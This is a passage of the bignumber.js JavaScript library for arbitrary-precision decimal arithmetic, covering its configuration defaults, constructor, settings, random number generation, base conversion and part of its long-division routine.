   *      integerValue                    |      CRYPTO
   *      isEqualTo                eq     |      MODULO_MODE
   *      isFinite                        |      POW_PRECISION
   *      isGreaterThan            gt     |      FORMAT
   *      isGreaterThanOrEqualTo   gte    |      ALPHABET
   *      isInteger                       |  isBigNumber
   *      isLessThan               lt     |  maximum              max
   *      isLessThanOrEqualTo      lte    |  minimum              min
   *      isNaN                           |  random
   *      isNegative                      |
   *      isPositive                      |
   *      isZero                          |
   *      minus                           |
   *      modulo                   mod    |
   *      multipliedBy             times  |
   *      negated                         |
   *      plus                            |
   *      precision                sd     |
   *      shiftedBy                       |
   *      squareRoot               sqrt   |
   *      toExponential                   |
   *      toFixed                         |
   *      toFormat                        |
   *      toFraction                      |
   *      toJSON                          |
   *      toNumber                        |
   *      toPrecision                     |
   *      toString                        |
   *      valueOf                         |
   *
   */

  var BigNumber,
      isNumeric = /^-?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?$/i,
      mathceil = Math.ceil,
      mathfloor = Math.floor,
      bignumberError = '[BigNumber Error] ',
      tooManyDigits = bignumberError + 'Number primitive has more than 15 significant digits: ',
      BASE = 1e14,
      LOG_BASE = 14,
      MAX_SAFE_INTEGER = 0x1fffffffffffff,
      // 2^53 - 1
  // MAX_INT32 = 0x7fffffff,                   // 2^31 - 1
  POWS_TEN = [1, 10, 100, 1e3, 1e4, 1e5, 1e6, 1e7, 1e8, 1e9, 1e10, 1e11, 1e12, 1e13],
      SQRT_BASE = 1e7,
      // EDITABLE
  // The limit on the value of DECIMAL_PLACES, TO_EXP_NEG, TO_EXP_POS, MIN_EXP, MAX_EXP, and
  // the arguments to toExponential, toFixed, toFormat, and toPrecision.
  MAX = 1E9; // 0 to MAX_INT32

  /*
   * Create and return a BigNumber constructor.
   */

  function clone(configObject) {
    var div,
        convertBase,
        parseNumeric,
        P = BigNumber.prototype = {
      constructor: BigNumber,
      toString: null,
      valueOf: null
    },
        ONE = new BigNumber(1),
        //----------------------------- EDITABLE CONFIG DEFAULTS -------------------------------
    // The default values below must be integers within the inclusive ranges stated.
    // The values can also be changed at run-time using BigNumber.set.
    // The maximum number of decimal places for operations involving division.
    DECIMAL_PLACES = 20,
        // 0 to MAX
    // The rounding mode used when rounding to the above decimal places, and when using
    // toExponential, toFixed, toFormat and toPrecision, and round (default value).
    // UP         0 Away from zero.
    // DOWN       1 Towards zero.
    // CEIL       2 Towards +Infinity.
    // FLOOR      3 Towards -Infinity.
    // HALF_UP    4 Towards nearest neighbour. If equidistant, up.
    // HALF_DOWN  5 Towards nearest neighbour. If equidistant, down.
    // HALF_EVEN  6 Towards nearest neighbour. If equidistant, towards even neighbour.
    // HALF_CEIL  7 Towards nearest neighbour. If equidistant, towards +Infinity.
    // HALF_FLOOR 8 Towards nearest neighbour. If equidistant, towards -Infinity.
    ROUNDING_MODE = 4,
        // 0 to 8
    // EXPONENTIAL_AT : [TO_EXP_NEG , TO_EXP_POS]
    // The exponent value at and beneath which toString returns exponential notation.
    // Number type: -7
    TO_EXP_NEG = -7,
        // 0 to -MAX
    // The exponent value at and above which toString returns exponential notation.
    // Number type: 21
    TO_EXP_POS = 21,
        // 0 to MAX
    // RANGE : [MIN_EXP, MAX_EXP]
    // The minimum exponent value, beneath which underflow to zero occurs.
    // Number type: -324  (5e-324)
    MIN_EXP = -1e7,
        // -1 to -MAX
    // The maximum exponent value, above which overflow to Infinity occurs.
    // Number type:  308  (1.7976931348623157e+308)
    // For MAX_EXP > 1e7, e.g. new BigNumber('1e100000000').plus(1) may be slow.
    MAX_EXP = 1e7,
        // 1 to MAX
    // Whether to use cryptographically-secure random number generation, if available.
    CRYPTO = false,
        // true or false
    // The modulo mode used when calculating the modulus: a mod n.
    // The quotient (q = a / n) is calculated according to the corresponding rounding mode.
    // The remainder (r) is calculated as: r = a - n * q.
    //
    // UP        0 The remainder is positive if the dividend is negative, else is negative.
    // DOWN      1 The remainder has the same sign as the dividend.
    //             This modulo mode is commonly known as 'truncated division' and is
    //             equivalent to (a % n) in JavaScript.
    // FLOOR     3 The remainder has the same sign as the divisor (Python %).
    // HALF_EVEN 6 This modulo mode implements the IEEE 754 remainder function.
    // EUCLID    9 Euclidian division. q = sign(n) * floor(a / abs(n)).
    //             The remainder is always positive.
    //
    // The truncated division, floored division, Euclidian division and IEEE 754 remainder
    // modes are commonly used for the modulus operation.
    // Although the other rounding modes can also be used, they may not give useful results.
    MODULO_MODE = 1,
        // 0 to 9
    // The maximum number of significant digits of the result of the exponentiatedBy operation.
    // If POW_PRECISION is 0, there will be unlimited significant digits.
    POW_PRECISION = 0,
        // 0 to MAX
    // The format specification used by the BigNumber.prototype.toFormat method.
    FORMAT = {
      decimalSeparator: '.',
      groupSeparator: ',',
      groupSize: 3,
      secondaryGroupSize: 0,
      fractionGroupSeparator: '\xA0',
      // non-breaking space
      fractionGroupSize: 0
    },
        // The alphabet used for base conversion.
    // It must be at least 2 characters long, with no '.' or repeated character.
    // '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$_'
    ALPHABET = '0123456789abcdefghijklmnopqrstuvwxyz'; //------------------------------------------------------------------------------------------
    // CONSTRUCTOR

    /*
     * The BigNumber constructor and exported function.
     * Create and return a new instance of a BigNumber object.
     *
     * n {number|string|BigNumber} A numeric value.
     * [b] {number} The base of n. Integer, 2 to ALPHABET.length inclusive.
     */

    function BigNumber(n, b) {
      var alphabet,
          c,
          caseChanged,
          e,
          i,
          isNum,
          len,
          str,
          x = this; // Enable constructor usage without new.

      if (!(x instanceof BigNumber)) {
        // Don't throw on constructor call without new (#81).
        // '[BigNumber Error] Constructor call without new: {n}'
        //throw Error(bignumberError + ' Constructor call without new: ' + n);
        return new BigNumber(n, b);
      }

      if (b == null) {
        // Duplicate.
        if (n instanceof BigNumber) {
          x.s = n.s;
          x.e = n.e;
          x.c = (n = n.c) ? n.slice() : n;
          return;
        }

        isNum = typeof n == 'number';

        if (isNum && n * 0 == 0) {
          // Use `1 / n` to handle minus zero also.
          x.s = 1 / n < 0 ? (n = -n, -1) : 1; // Faster path for integers.

          if (n === ~~n) {
            for (e = 0, i = n; i >= 10; i /= 10, e++) {
              ;
            }

            x.e = e;
            x.c = [n];
            return;
          }

          str = n + '';
        } else {
          if (!isNumeric.test(str = n + '')) return parseNumeric(x, str, isNum);
          x.s = str.charCodeAt(0) == 45 ? (str = str.slice(1), -1) : 1;
        } // Decimal point?


        if ((e = str.indexOf('.')) > -1) str = str.replace('.', ''); // Exponential form?

        if ((i = str.search(/e/i)) > 0) {
          // Determine exponent.
          if (e < 0) e = i;
          e += +str.slice(i + 1);
          str = str.substring(0, i);
        } else if (e < 0) {
          // Integer.
          e = str.length;
        }
      } else {
        // '[BigNumber Error] Base {not a primitive number|not an integer|out of range}: {b}'
        intCheck(b, 2, ALPHABET.length, 'Base');
        str = n + ''; // Allow exponential notation to be used with base 10 argument, while
        // also rounding to DECIMAL_PLACES as with other bases.

        if (b == 10) {
          x = new BigNumber(n instanceof BigNumber ? n : str);
          return round(x, DECIMAL_PLACES + x.e + 1, ROUNDING_MODE);
        }

        isNum = typeof n == 'number';

        if (isNum) {
          // Avoid potential interpretation of Infinity and NaN as base 44+ values.
          if (n * 0 != 0) return parseNumeric(x, str, isNum, b);
          x.s = 1 / n < 0 ? (str = str.slice(1), -1) : 1; // '[BigNumber Error] Number primitive has more than 15 significant digits: {n}'

          if (BigNumber.DEBUG && str.replace(/^0\.0*|\./, '').length > 15) {
            throw Error(tooManyDigits + n);
          } // Prevent later check for length on converted number.


          isNum = false;
        } else {
          x.s = str.charCodeAt(0) === 45 ? (str = str.slice(1), -1) : 1;
        }

        alphabet = ALPHABET.slice(0, b);
        e = i = 0; // Check that str is a valid base b number.
        // Don't use RegExp so alphabet can contain special characters.

        for (len = str.length; i < len; i++) {
          if (alphabet.indexOf(c = str.charAt(i)) < 0) {
            if (c == '.') {
              // If '.' is not the first character and it has not be found before.
              if (i > e) {
                e = len;
                continue;
              }
            } else if (!caseChanged) {
              // Allow e.g. hexadecimal 'FF' as well as 'ff'.
              if (str == str.toUpperCase() && (str = str.toLowerCase()) || str == str.toLowerCase() && (str = str.toUpperCase())) {
                caseChanged = true;
                i = -1;
                e = 0;
                continue;
              }
            }

            return parseNumeric(x, n + '', isNum, b);
          }
        }

        str = convertBase(str, b, 10, x.s); // Decimal point?

        if ((e = str.indexOf('.')) > -1) str = str.replace('.', '');else e = str.length;
      } // Determine leading zeros.


      for (i = 0; str.charCodeAt(i) === 48; i++) {
        ;
      } // Determine trailing zeros.


      for (len = str.length; str.charCodeAt(--len) === 48;) {
        ;
      }

      str = str.slice(i, ++len);

      if (str) {
        len -= i; // '[BigNumber Error] Number primitive has more than 15 significant digits: {n}'

        if (isNum && BigNumber.DEBUG && len > 15 && (n > MAX_SAFE_INTEGER || n !== mathfloor(n))) {
          throw Error(tooManyDigits + x.s * n);
        }

        e = e - i - 1; // Overflow?

        if (e > MAX_EXP) {
          // Infinity.
          x.c = x.e = null; // Underflow?
        } else if (e < MIN_EXP) {
          // Zero.
          x.c = [x.e = 0];
        } else {
          x.e = e;
          x.c = []; // Transform base
          // e is the base 10 exponent.
          // i is where to slice str to get the first element of the coefficient array.

          i = (e + 1) % LOG_BASE;
          if (e < 0) i += LOG_BASE;

          if (i < len) {
            if (i) x.c.push(+str.slice(0, i));

            for (len -= LOG_BASE; i < len;) {
              x.c.push(+str.slice(i, i += LOG_BASE));
            }

            str = str.slice(i);
            i = LOG_BASE - str.length;
          } else {
            i -= len;
          }

          for (; i--; str += '0') {
            ;
          }

          x.c.push(+str);
        }
      } else {
        // Zero.
        x.c = [x.e = 0];
      }
    } // CONSTRUCTOR PROPERTIES


    BigNumber.clone = clone;
    BigNumber.ROUND_UP = 0;
    BigNumber.ROUND_DOWN = 1;
    BigNumber.ROUND_CEIL = 2;
    BigNumber.ROUND_FLOOR = 3;
    BigNumber.ROUND_HALF_UP = 4;
    BigNumber.ROUND_HALF_DOWN = 5;
    BigNumber.ROUND_HALF_EVEN = 6;
    BigNumber.ROUND_HALF_CEIL = 7;
    BigNumber.ROUND_HALF_FLOOR = 8;
    BigNumber.EUCLID = 9;
    /*
     * Configure infrequently-changing library-wide settings.
     *
     * Accept an object with the following optional properties (if the value of a property is
     * a number, it must be an integer within the inclusive range stated):
     *
     *   DECIMAL_PLACES   {number}           0 to MAX
     *   ROUNDING_MODE    {number}           0 to 8
     *   EXPONENTIAL_AT   {number|number[]}  -MAX to MAX  or  [-MAX to 0, 0 to MAX]
     *   RANGE            {number|number[]}  -MAX to MAX (not zero)  or  [-MAX to -1, 1 to MAX]
     *   CRYPTO           {boolean}          true or false
     *   MODULO_MODE      {number}           0 to 9
     *   POW_PRECISION       {number}           0 to MAX
     *   ALPHABET         {string}           A string of two or more unique characters which does
     *                                       not contain '.'.
     *   FORMAT           {object}           An object with some of the following properties:
     *      decimalSeparator       {string}
     *      groupSeparator         {string}
     *      groupSize              {number}
     *      secondaryGroupSize     {number}
     *      fractionGroupSeparator {string}
     *      fractionGroupSize      {number}
     *
     * (The values assigned to the above FORMAT object properties are not checked for validity.)
     *
     * E.g.
     * BigNumber.config({ DECIMAL_PLACES : 20, ROUNDING_MODE : 4 })
     *
     * Ignore properties/parameters set to null or undefined, except for ALPHABET.
     *
     * Return an object with the properties current values.
     */

    BigNumber.config = BigNumber.set = function (obj) {
      var p, v;

      if (obj != null) {
        if (typeof obj == 'object') {
          // DECIMAL_PLACES {number} Integer, 0 to MAX inclusive.
          // '[BigNumber Error] DECIMAL_PLACES {not a primitive number|not an integer|out of range}: {v}'
          if (obj.hasOwnProperty(p = 'DECIMAL_PLACES')) {
            v = obj[p];
            intCheck(v, 0, MAX, p);
            DECIMAL_PLACES = v;
          } // ROUNDING_MODE {number} Integer, 0 to 8 inclusive.
          // '[BigNumber Error] ROUNDING_MODE {not a primitive number|not an integer|out of range}: {v}'


          if (obj.hasOwnProperty(p = 'ROUNDING_MODE')) {
            v = obj[p];
            intCheck(v, 0, 8, p);
            ROUNDING_MODE = v;
          } // EXPONENTIAL_AT {number|number[]}
          // Integer, -MAX to MAX inclusive or
          // [integer -MAX to 0 inclusive, 0 to MAX inclusive].
          // '[BigNumber Error] EXPONENTIAL_AT {not a primitive number|not an integer|out of range}: {v}'


          if (obj.hasOwnProperty(p = 'EXPONENTIAL_AT')) {
            v = obj[p];

            if (isArray(v)) {
              intCheck(v[0], -MAX, 0, p);
              intCheck(v[1], 0, MAX, p);
              TO_EXP_NEG = v[0];
              TO_EXP_POS = v[1];
            } else {
              intCheck(v, -MAX, MAX, p);
              TO_EXP_NEG = -(TO_EXP_POS = v < 0 ? -v : v);
            }
          } // RANGE {number|number[]} Non-zero integer, -MAX to MAX inclusive or
          // [integer -MAX to -1 inclusive, integer 1 to MAX inclusive].
          // '[BigNumber Error] RANGE {not a primitive number|not an integer|out of range|cannot be zero}: {v}'


          if (obj.hasOwnProperty(p = 'RANGE')) {
            v = obj[p];

            if (isArray(v)) {
              intCheck(v[0], -MAX, -1, p);
              intCheck(v[1], 1, MAX, p);
              MIN_EXP = v[0];
              MAX_EXP = v[1];
            } else {
              intCheck(v, -MAX, MAX, p);

              if (v) {
                MIN_EXP = -(MAX_EXP = v < 0 ? -v : v);
              } else {
                throw Error(bignumberError + p + ' cannot be zero: ' + v);
              }
            }
          } // CRYPTO {boolean} true or false.
          // '[BigNumber Error] CRYPTO not true or false: {v}'
          // '[BigNumber Error] crypto unavailable'


          if (obj.hasOwnProperty(p = 'CRYPTO')) {
            v = obj[p];

            if (v === !!v) {
              if (v) {
                if (typeof crypto != 'undefined' && crypto && (crypto.getRandomValues || crypto.randomBytes)) {
                  CRYPTO = v;
                } else {
                  CRYPTO = !v;
                  throw Error(bignumberError + 'crypto unavailable');
                }
              } else {
                CRYPTO = v;
              }
            } else {
              throw Error(bignumberError + p + ' not true or false: ' + v);
            }
          } // MODULO_MODE {number} Integer, 0 to 9 inclusive.
          // '[BigNumber Error] MODULO_MODE {not a primitive number|not an integer|out of range}: {v}'


          if (obj.hasOwnProperty(p = 'MODULO_MODE')) {
            v = obj[p];
            intCheck(v, 0, 9, p);
            MODULO_MODE = v;
          } // POW_PRECISION {number} Integer, 0 to MAX inclusive.
          // '[BigNumber Error] POW_PRECISION {not a primitive number|not an integer|out of range}: {v}'


          if (obj.hasOwnProperty(p = 'POW_PRECISION')) {
            v = obj[p];
            intCheck(v, 0, MAX, p);
            POW_PRECISION = v;
          } // FORMAT {object}
          // '[BigNumber Error] FORMAT not an object: {v}'


          if (obj.hasOwnProperty(p = 'FORMAT')) {
            v = obj[p];
            if (typeof v == 'object') FORMAT = v;else throw Error(bignumberError + p + ' not an object: ' + v);
          } // ALPHABET {string}
          // '[BigNumber Error] ALPHABET invalid: {v}'


          if (obj.hasOwnProperty(p = 'ALPHABET')) {
            v = obj[p]; // Disallow if only one character, or contains '.' or a repeated character.

            if (typeof v == 'string' && !/^.$|\.|(.).*\1/.test(v)) {
              ALPHABET = v;
            } else {
              throw Error(bignumberError + p + ' invalid: ' + v);
            }
          }
        } else {
          // '[BigNumber Error] Object expected: {v}'
          throw Error(bignumberError + 'Object expected: ' + obj);
        }
      }

      return {
        DECIMAL_PLACES: DECIMAL_PLACES,
        ROUNDING_MODE: ROUNDING_MODE,
        EXPONENTIAL_AT: [TO_EXP_NEG, TO_EXP_POS],
        RANGE: [MIN_EXP, MAX_EXP],
        CRYPTO: CRYPTO,
        MODULO_MODE: MODULO_MODE,
        POW_PRECISION: POW_PRECISION,
        FORMAT: FORMAT,
        ALPHABET: ALPHABET
      };
    };
    /*
     * Return true if v is a BigNumber instance, otherwise return false.
     *
     * v {any}
     */


    BigNumber.isBigNumber = function (v) {
      return v instanceof BigNumber || v && v._isBigNumber === true || false;
    };
    /*
     * Return a new BigNumber whose value is the maximum of the arguments.
     *
     * arguments {number|string|BigNumber}
     */


    BigNumber.maximum = BigNumber.max = function () {
      return maxOrMin(arguments, P.lt);
    };
    /*
     * Return a new BigNumber whose value is the minimum of the arguments.
     *
     * arguments {number|string|BigNumber}
     */


    BigNumber.minimum = BigNumber.min = function () {
      return maxOrMin(arguments, P.gt);
    };
    /*
     * Return a new BigNumber with a random value equal to or greater than 0 and less than 1,
     * and with dp, or DECIMAL_PLACES if dp is omitted, decimal places (or less if trailing
     * zeros are produced).
     *
     * [dp] {number} Decimal places. Integer, 0 to MAX inclusive.
     *
     * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {dp}'
     * '[BigNumber Error] crypto unavailable'
     */


    BigNumber.random = function () {
      var pow2_53 = 0x20000000000000; // Return a 53 bit integer n, where 0 <= n < 9007199254740992.
      // Check if Math.random() produces more than 32 bits of randomness.
      // If it does, assume at least 53 bits are produced, otherwise assume at least 30 bits.
      // 0x40000000 is 2^30, 0x800000 is 2^23, 0x1fffff is 2^21 - 1.

      var random53bitInt = Math.random() * pow2_53 & 0x1fffff ? function () {
        return mathfloor(Math.random() * pow2_53);
      } : function () {
        return (Math.random() * 0x40000000 | 0) * 0x800000 + (Math.random() * 0x800000 | 0);
      };
      return function (dp) {
        var a,
            b,
            e,
            k,
            v,
            i = 0,
            c = [],
            rand = new BigNumber(ONE);
        if (dp == null) dp = DECIMAL_PLACES;else intCheck(dp, 0, MAX);
        k = mathceil(dp / LOG_BASE);

        if (CRYPTO) {
          // Browsers supporting crypto.getRandomValues.
          if (crypto.getRandomValues) {
            a = crypto.getRandomValues(new Uint32Array(k *= 2));

            for (; i < k;) {
              // 53 bits:
              // ((Math.pow(2, 32) - 1) * Math.pow(2, 21)).toString(2)
              // 11111 11111111 11111111 11111111 11100000 00000000 00000000
              // ((Math.pow(2, 32) - 1) >>> 11).toString(2)
              //                                     11111 11111111 11111111
              // 0x20000 is 2^21.
              v = a[i] * 0x20000 + (a[i + 1] >>> 11); // Rejection sampling:
              // 0 <= v < 9007199254740992
              // Probability that v >= 9e15, is
              // 7199254740992 / 9007199254740992 ~= 0.0008, i.e. 1 in 1251

              if (v >= 9e15) {
                b = crypto.getRandomValues(new Uint32Array(2));
                a[i] = b[0];
                a[i + 1] = b[1];
              } else {
                // 0 <= v <= 8999999999999999
                // 0 <= (v % 1e14) <= 99999999999999
                c.push(v % 1e14);
                i += 2;
              }
            }

            i = k / 2; // Node.js supporting crypto.randomBytes.
          } else if (crypto.randomBytes) {
            // buffer
            a = crypto.randomBytes(k *= 7);

            for (; i < k;) {
              // 0x1000000000000 is 2^48, 0x10000000000 is 2^40
              // 0x100000000 is 2^32, 0x1000000 is 2^24
              // 11111 11111111 11111111 11111111 11111111 11111111 11111111
              // 0 <= v < 9007199254740992
              v = (a[i] & 31) * 0x1000000000000 + a[i + 1] * 0x10000000000 + a[i + 2] * 0x100000000 + a[i + 3] * 0x1000000 + (a[i + 4] << 16) + (a[i + 5] << 8) + a[i + 6];

              if (v >= 9e15) {
                crypto.randomBytes(7).copy(a, i);
              } else {
                // 0 <= (v % 1e14) <= 99999999999999
                c.push(v % 1e14);
                i += 7;
              }
            }

            i = k / 7;
          } else {
            CRYPTO = false;
            throw Error(bignumberError + 'crypto unavailable');
          }
        } // Use Math.random.


        if (!CRYPTO) {
          for (; i < k;) {
            v = random53bitInt();
            if (v < 9e15) c[i++] = v % 1e14;
          }
        }

        k = c[--i];
        dp %= LOG_BASE; // Convert trailing digits to zeros according to dp.

        if (k && dp) {
          v = POWS_TEN[LOG_BASE - dp];
          c[i] = mathfloor(k / v) * v;
        } // Remove trailing elements which are zero.


        for (; c[i] === 0; c.pop(), i--) {
          ;
        } // Zero?


        if (i < 0) {
          c = [e = 0];
        } else {
          // Remove leading elements which are zero and adjust exponent accordingly.
          for (e = -1; c[0] === 0; c.splice(0, 1), e -= LOG_BASE) {
            ;
          } // Count the digits of the first element of c to determine leading zeros, and...


          for (i = 1, v = c[0]; v >= 10; v /= 10, i++) {
            ;
          } // adjust the exponent accordingly.


          if (i < LOG_BASE) e -= LOG_BASE - i;
        }

        rand.e = e;
        rand.c = c;
        return rand;
      };
    }(); // PRIVATE FUNCTIONS
    // Called by BigNumber and BigNumber.prototype.toString.


    convertBase = function () {
      var decimal = '0123456789';
      /*
       * Convert string of baseIn to an array of numbers of baseOut.
       * Eg. toBaseOut('255', 10, 16) returns [15, 15].
       * Eg. toBaseOut('ff', 16, 10) returns [2, 5, 5].
       */

      function toBaseOut(str, baseIn, baseOut, alphabet) {
        var j,
            arr = [0],
            arrL,
            i = 0,
            len = str.length;

        for (; i < len;) {
          for (arrL = arr.length; arrL--; arr[arrL] *= baseIn) {
            ;
          }

          arr[0] += alphabet.indexOf(str.charAt(i++));

          for (j = 0; j < arr.length; j++) {
            if (arr[j] > baseOut - 1) {
              if (arr[j + 1] == null) arr[j + 1] = 0;
              arr[j + 1] += arr[j] / baseOut | 0;
              arr[j] %= baseOut;
            }
          }
        }

        return arr.reverse();
      } // Convert a numeric string of baseIn to a numeric string of baseOut.
      // If the caller is toString, we are converting from base 10 to baseOut.
      // If the caller is BigNumber, we are converting from baseIn to base 10.


      return function (str, baseIn, baseOut, sign, callerIsToString) {
        var alphabet,
            d,
            e,
            k,
            r,
            x,
            xc,
            y,
            i = str.indexOf('.'),
            dp = DECIMAL_PLACES,
            rm = ROUNDING_MODE; // Non-integer.

        if (i >= 0) {
          k = POW_PRECISION; // Unlimited precision.

          POW_PRECISION = 0;
          str = str.replace('.', '');
          y = new BigNumber(baseIn);
          x = y.pow(str.length - i);
          POW_PRECISION = k; // Convert str as if an integer, then restore the fraction part by dividing the
          // result by its base raised to a power.

          y.c = toBaseOut(toFixedPoint(coeffToString(x.c), x.e, '0'), 10, baseOut, decimal);
          y.e = y.c.length;
        } // Convert the number as integer.


        xc = toBaseOut(str, baseIn, baseOut, callerIsToString ? (alphabet = ALPHABET, decimal) : (alphabet = decimal, ALPHABET)); // xc now represents str as an integer and converted to baseOut. e is the exponent.

        e = k = xc.length; // Remove trailing zeros.

        for (; xc[--k] == 0; xc.pop()) {
          ;
        } // Zero?


        if (!xc[0]) return alphabet.charAt(0); // Does str represent an integer? If so, no need for the division.

        if (i < 0) {
          --e;
        } else {
          x.c = xc;
          x.e = e; // The sign is needed for correct rounding.

          x.s = sign;
          x = div(x, y, dp, rm, baseOut);
          xc = x.c;
          r = x.r;
          e = x.e;
        } // xc now represents str converted to baseOut.
        // THe index of the rounding digit.


        d = e + dp + 1; // The rounding digit: the digit to the right of the digit that may be rounded up.

        i = xc[d]; // Look at the rounding digits and mode to determine whether to round up.

        k = baseOut / 2;
        r = r || d < 0 || xc[d + 1] != null;
        r = rm < 4 ? (i != null || r) && (rm == 0 || rm == (x.s < 0 ? 3 : 2)) : i > k || i == k && (rm == 4 || r || rm == 6 && xc[d - 1] & 1 || rm == (x.s < 0 ? 8 : 7)); // If the index of the rounding digit is not greater than zero, or xc represents
        // zero, then the result of the base conversion is zero or, if rounding up, a value
        // such as 0.00001.

        if (d < 1 || !xc[0]) {
          // 1^-dp or 0
          str = r ? toFixedPoint(alphabet.charAt(1), -dp, alphabet.charAt(0)) : alphabet.charAt(0);
        } else {
          // Truncate xc to the required number of decimal places.
          xc.length = d; // Round up?

          if (r) {
            // Rounding up may mean the previous digit has to be rounded up and so on.
            for (--baseOut; ++xc[--d] > baseOut;) {
              xc[d] = 0;

              if (!d) {
                ++e;
                xc = [1].concat(xc);
              }
            }
          } // Determine trailing zeros.


          for (k = xc.length; !xc[--k];) {
            ;
          } // E.g. [4, 11, 15] becomes 4bf.


          for (i = 0, str = ''; i <= k; str += alphabet.charAt(xc[i++])) {
            ;
          } // Add leading zeros, decimal point and trailing zeros as required.


          str = toFixedPoint(str, e, alphabet.charAt(0));
        } // The caller will add the sign.


        return str;
      };
    }(); // Perform division in the specified base. Called by div and convertBase.


    div = function () {
      // Assume non-zero x and k.
      function multiply(x, k, base) {
        var m,
            temp,
            xlo,
            xhi,
            carry = 0,
            i = x.length,
            klo = k % SQRT_BASE,
            khi = k / SQRT_BASE | 0;

        for (x = x.slice(); i--;) {
          xlo = x[i] % SQRT_BASE;
          xhi = x[i] / SQRT_BASE | 0;
          m = khi * xlo + xhi * klo;
          temp = klo * xlo + m % SQRT_BASE * SQRT_BASE + carry;
          carry = (temp / base | 0) + (m / SQRT_BASE | 0) + khi * xhi;
          x[i] = temp % base;
        }

        if (carry) x = [carry].concat(x);
        return x;
      }

      function compare(a, b, aL, bL) {
        var i, cmp;

        if (aL != bL) {
          cmp = aL > bL ? 1 : -1;
        } else {
          for (i = cmp = 0; i < aL; i++) {
            if (a[i] != b[i]) {
              cmp = a[i] > b[i] ? 1 : -1;
              break;
            }
          }
        }

        return cmp;
      }

      function subtract(a, b, aL, base) {
        var i = 0; // Subtract b from a.

        for (; aL--;) {
          a[aL] -= i;
          i = a[aL] < b[aL] ? 1 : 0;
          a[aL] = i * base + a[aL] - b[aL];
        } // Remove leading zeros.


        for (; !a[0] && a.length > 1; a.splice(0, 1)) {
          ;
        }
      } // x: dividend, y: divisor.


      return function (x, y, dp, rm, base) {
        var cmp,
            e,
            i,
            more,
            n,
            prod,
            prodL,
            q,
            qc,
            rem,
            remL,
            rem0,
            xi,
            xL,
            yc0,
            yL,
            yz,
            s = x.s == y.s ? 1 : -1,
            xc = x.c,
            yc = y.c; // Either NaN, Infinity or 0?

        if (!xc || !xc[0] || !yc || !yc[0]) {
          return new BigNumber( // Return NaN if either NaN, or both Infinity or 0.
          !x.s || !y.s || (xc ? yc && xc[0] == yc[0] : !yc) ? NaN : // Return 卤0 if x is 卤0 or y is 卤Infinity, or return 卤Infinity as y is 卤0.
          xc && xc[0] == 0 || !yc ? s * 0 : s / 0);
        }

        q = new BigNumber(s);
        qc = q.c = [];
        e = x.e - y.e;
        s = dp + e + 1;

        if (!base) {
          base = BASE;
          e = bitFloor(x.e / LOG_BASE) - bitFloor(y.e / LOG_BASE);
          s = s / LOG_BASE | 0;
        } // Result exponent may be one less then the current value of e.
        // The coefficients of the BigNumbers from convertBase may have trailing zeros.


        for (i = 0; yc[i] == (xc[i] || 0); i++) {
          ;
        }

        if (yc[i] > (xc[i] || 0)) e--;

        if (s < 0) {
          qc.push(1);
          more = true;
        } else {
          xL = xc.length;
          yL = yc.length;
          i = 0;
          s += 2; // Normalise xc and yc so highest order digit of yc is >= base / 2.

          n = mathfloor(base / (yc[0] + 1)); // Not necessary, but to handle odd bases where yc[0] == (base / 2) - 1.
          // if (n > 1 || n++ == 1 && yc[0] < base / 2) {

          if (n > 1) {
            yc = multiply(yc, n, base);
            xc = multiply(xc, n, base);
            yL = yc.length;
            xL = xc.length;
          }

          xi = yL;
          rem = xc.slice(0, yL);
          remL = rem.length; // Add zeros to make remainder as long as divisor.

          for (; remL < yL; rem[remL++] = 0) {
            ;
          }

          yz = yc.slice();
          yz = [0].concat(yz);
          yc0 = yc[0];
          if (yc[1] >= base / 2) yc0++; // Not necessary, but to prevent trial digit n > base, when using base 3.
          // else if (base == 3 && yc0 == 1) yc0 = 1 + 1e-15;

          do {
            n = 0; // Compare divisor and remainder.

            cmp = compare(yc, rem, yL, remL); // If divisor < remainder.

            if (cmp < 0) {
              // Calculate trial digit, n.
              rem0 = rem[0];
              if (yL != remL) rem0 = rem0 * base + (rem[1] || 0); // n is how many times the divisor goes into the current remainder.

              n = mathfloor(rem0 / yc0); //  Algorithm:
              //  product = divisor multiplied by trial digit (n).
              //  Compare product and remainder.
              //  If product is greater than remainder:
              //    Subtract divisor from product, decrement trial digit.
              //  Subtract product from remainder.
              //  If product was less than remainder at the last compare:
              //    Compare new remainder and divisor.
              //    If remainder is greater than divisor:
              //      Subtract divisor from remainder, increment trial digit.

              if (n > 1) {
                // n may be > base only when base is 3.
                if (n >= base) n = base - 1; // product = divisor * trial digit.

                prod = multiply(yc, n, base);
                prodL = prod.length;
                remL = rem.length; // Compare product and remainder.
                // If product > remainder then trial digit n too high.
                // n is 1 too high about 5% of the time, and is not known to have
                // ever been more than 1 too high.

                while (compare(prod, rem, prodL, remL) == 1) {
                  n--; // Subtract divisor from product.

                  subtract(prod, yL < prodL ? yz : yc, prodL, base);
                  prodL = prod.length;
                  cmp = 1;
                }
              } else {
                // n is 0 or 1, cmp is -1.
                // If n is 0, there is no need to compare yc and rem again below,
                // so change cmp to 1 to avoid it.
                // If n is 1, leave cmp as -1, so yc and rem are compared again.
                if (n == 0) {
                  // divisor < remainder, so n must be at least 1.
                  cmp = n = 1;
                } // product = divisor


                prod = yc.slice();
                prodL = prod.length;
              }

              if (prodL < remL) prod = [0].concat(prod); // Subtract product from remainder.

              subtract(rem, prod, remL, base);
              remL = rem.length; // If product was < remainder.

              if (cmp == -1) {
                // Compare divisor and new remainder.
                // If divisor < new remainder, subtract divisor from remainder.
                // Trial digit n too low.
                // n is 1 too low about 5% of the time, and very rarely 2 too low.
                while (compare(yc, rem, yL, remL) < 1) {
                  n++; // Subtract divisor from remainder.

                  subtract(rem, yL < remL ? yz : yc, remL, base);
                  remL = rem.length;
                }
              }
            } else if (cmp === 0) {
              n++;
              rem = [0];
            } // else cmp === 1 and n will be 0
            // Add the next digit, n, to the result array.


            qc[i++] = n; // Update the remainder.

            if (rem[0]) {
              rem[remL++] = xc[xi] || 0;
            } else {
              rem = [xc[xi]];
              remL = 1;
            }
          } while ((xi++ < xL || rem[0] != null) && s--);

          more = rem[0] != null; // Leading zero?

          if (!qc[0]) qc.splice(0, 1);
        }

        if (base == BASE) {
          // To calculate q.e, first get the number of digits of qc[0].
          for (i = 1, s = qc[0]; s >= 10; s /= 10, i++) {
            ;
          }

          round(q, dp + (q.e = i + e * LOG_BASE - 1) + 1, rm, more); // Caller is convertBase.
        } else {
          q.e = e;
          q.r = +more;
